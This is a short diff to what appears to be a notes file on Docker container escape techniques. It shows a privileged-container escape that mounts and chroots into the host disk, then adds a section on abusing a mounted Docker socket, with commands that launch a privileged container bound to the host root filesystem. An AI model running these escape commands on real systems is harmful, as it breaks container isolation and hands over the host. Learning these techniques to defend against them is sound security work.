@@ -19,3 +19,13 @@ docker run --privileged -it ubuntu bash
 mount /dev/sda1 /mnt    # mount host disk
 chroot /mnt             # change root to host filesystem
 # Now operating directly on the host OS
+
+2. Exposed Docker Socket
+If /var/run/docker.sock is mounted inside a container
+The container can control the Docker daemon directly
+Can create new privileged containers to escape to host
+
+# Exploiting mounted Docker socket
+ls /var/run/docker.sock  # check if socket is mounted
+docker -H unix:///var/run/docker.sock run --privileged \
+  -v /:/host ubuntu chroot /host
